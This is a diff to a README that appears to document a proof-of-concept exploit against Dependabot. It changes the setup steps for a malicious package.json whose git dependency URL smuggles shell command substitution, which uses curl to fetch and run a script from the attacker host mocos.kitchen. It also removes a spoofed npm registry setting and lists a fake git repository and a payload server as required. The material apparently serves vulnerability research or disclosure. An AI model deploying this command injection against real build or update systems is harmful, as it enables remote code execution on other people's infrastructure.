@@ -8,11 +8,6 @@ After the preparation, you can see your dependabot result from `https://github.c
 
 Add following files:
 
-`.npmrc`
-```
-registry="http://registry.npmjs.org@mocos.kitchen/registry"
-```
-
 `package-lock.json`
 ```
 {
@@ -22,7 +17,7 @@ registry="http://registry.npmjs.org@mocos.kitchen/registry"
   "requires": true,
   "dependencies": {
     "tyage-sample-package": {
-      "version": "3.0.0"
+      "version": "4.0.0"
     }
   }
 }
@@ -37,7 +32,7 @@ registry="http://registry.npmjs.org@mocos.kitchen/registry"
   "license": "MIT",
   "private": true,
   "dependencies": {
-    "package1": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
+    "tyage-sample-package": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
   }
 }
 ```
@@ -57,18 +52,7 @@ updates:
 
 Following servers required.
 
-1. Fake npm registry
-
-`http://registry.npmjs.org@mocos.kitchen/registry/package1` should return this file:
-
-```json
-{
-    "name": "tyage-sample-package",
-    "version": "a"
-}
-```
-
-2. Fake git repository
+1. Fake git repository
 
 `https://github.com.mocos.kitchen/github.com/...` should run this PHP file:
 
@@ -104,7 +88,7 @@ if (!empty($input)) {
 }
 ```
 
-3. Payload server
+2. Payload server
 
 `http://mocos.kitchen:3000/bash.txt` return this:
 
